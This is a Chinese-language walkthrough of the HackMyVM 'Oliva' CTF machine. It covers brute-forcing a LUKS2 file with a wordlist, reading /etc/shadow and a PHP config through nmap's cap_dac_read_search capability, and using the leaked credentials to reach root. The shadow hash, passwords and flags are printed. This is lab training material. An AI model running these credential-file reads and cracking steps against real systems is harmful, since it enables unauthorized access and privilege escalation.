# Oliva

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=Oliva

[video](https://www.bilibili.com/video/BV11jQqYEEuf/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 发现 http://192.168.5.39/index.php 提示点击链接 http://192.168.5.39/oliva 获得 root 密码。file 查看文件属性发现是 oliva: LUKS encrypted file, ver 2, 使用 sha256 进行的加密, 需要进行解密。

进行文件分割:

```
dd  if=oliva of=oliva-drive-cut.dd bs=512 count=4097
```

进行爆破，但是没戏，发现 hashcat 14600 只支持 v1 版本的 LUKS 文件破解:

```
hashcat -m 14600 -a 0 oliva-drive-cut.dd /usr/share/wordlist/rockyou.txt
```

在找一下其他的破解工具，找到了这个可以破解 v2 版本的文件 bruteforce-luks L

```
sudo apt install bruteforce-luks
bruteforce-luks -t 16 -f /usr/share/wordlists/rockyou.txt oliva -v 5
```

找到密码: bebita , 在使用 cryptsetup 挂载加密磁盘:

```
cryptsetup luksOpen oliva m
```

挂载到了 /dev/mapper/m 下 进行文件挂载：

```
mkdir m
sudo mount /dev/mapper/m m
```

进入 m 目录，发现密码文件：

```
cat mypass.txt
Yesthatsmypass!
```

尝试使用 oliva 用户登陆 ssh，先拿到 user flag:

```
oliva@oliva:~$ cat user.txt
HMVY0H8NgGJqbFzbgo0VMRm
```

发现 capabilities 程序:

```
oliva@oliva:/$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

利用 cap_dac_read_search 权限读取敏感信息：

```
/usr/bin/nmap -iL /etc/shadow

root:$y$j9T$mJZXSkk0PjMpjwgunTu3a.$xlW8pdbOdxHdqCatq072mj3qQ69To4Gy6WbRwSbY6S3:19542:0:99999:7:::
```

但是 john 没破解出来:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash --pot=./pot
```

猜不出 root 目录中的 roo flag 的文件名读取不到。

在回头看看 html 目录中的 web 文件，都是 www-data 所属，读取一下看看会不会有重要信息 index.php

```
/usr/bin/nmap -iL /var/www/html/index.php

Hi oliva, Here the pass to obtain root: <?php $dbname = 'easy'; $dbuser = 'root'; $dbpass = 'Savingmypass'; $dbhost = 'localhost'; ?>
```

链接到 mysql，拿到 root 用户的密码:

```
MariaDB [easy]> select * from easy.logging;
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! |
+--------+------+--------------+
```

su 切换到 root，拿到 root flag:

```
root@oliva:~# cat rutflag.txt
HMVnuTkm4MwFQNPmMJHRyW7
```

最后记得 umount 磁盘，并且关闭 luks 加密磁盘:

```
sudo umount m
sudo cryptsetup close m
```
